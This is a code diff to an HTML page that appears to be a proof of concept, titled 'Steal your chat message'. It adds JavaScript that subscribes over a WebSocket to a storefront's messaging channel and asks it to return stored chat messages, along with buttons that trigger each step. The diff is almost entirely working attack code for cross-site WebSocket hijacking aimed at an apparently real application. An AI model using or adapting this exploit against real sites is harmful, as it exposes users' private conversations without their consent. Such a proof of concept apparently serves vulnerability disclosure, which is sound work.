@@ -62,9 +62,21 @@
 	  }
 
 	  window.addEventListener("load", init, false);
-
+	  
+		  
+         function step1(){
+		doSend('{"command":"subscribe","identifier":"{\"channel\":\"Storefront::Messaging::MessagesChannel\"}"}');
+	  }
+	  
+	  function step2(){
+		doSend('{"command":"message","identifier":"{\"channel\":\"Storefront::Messaging::MessagesChannel\"}","data":"{\"action\":\"retrieve_messages\"}"}');
+	}
 	  </script>
 
 	  <h2>Steal your chat message,POC johnstone</h2>
-
+	  
+          <div id="command">
+		  <button onclick="step1()">step 1</button>
+		  <button onclick="step2()">step 2</button>
+	  </div>
 	  <div id="output"></div>
